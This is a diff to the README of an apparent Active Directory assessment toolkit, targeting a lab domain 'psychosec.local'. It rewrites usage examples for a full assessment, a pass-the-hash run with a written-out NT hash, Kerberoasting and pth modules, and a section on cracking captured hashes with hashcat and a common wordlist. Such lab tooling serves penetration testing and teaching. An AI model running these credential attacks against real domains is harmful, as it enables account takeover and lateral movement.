@@ -108,18 +108,17 @@ pip install ldap3 impacket reportlab
 ```
 
 ## Usage
-
-### Run full assessment (ADMIN.TEST CAN BUG)
+### Run full assessment
 ```bash
 python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local \
-  --pth --pth-user admin.test --nthash 520126...
+  -u labadmin -p "LabPassword" --all
 ```
 
 ### Run full assessment with Pass-the-Hash
 ```bash
 python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local \
-  -u labadmin -p "Password" --all \
-  --pth --pth-user admin.helpdesk --nthash 520126a03f5d5a8d836f1c4f34ede7ce
+  -u labadmin -p "LabPassword" --all \
+  --pth --pth-user admin.test --nthash 520126a03f5d5a8d836f1c4f34ede7ce
 ```
 
 ### Individual modules
@@ -137,7 +136,8 @@ python3 kerberoast.py --dc-ip 192.168.56.10 --domain psychosec.local -u labadmin
 python3 pth.py --dc-ip 192.168.56.10 --domain psychosec.local -u admin.test --nthash 520126...
 ```
 
-### Cracking captured hashes
+## Cracking captured hashes
+
 Install hashcat and download rockyou wordlist(many common passwords):
 ```bash
 sudo apt update && sudo apt install hashcat -y
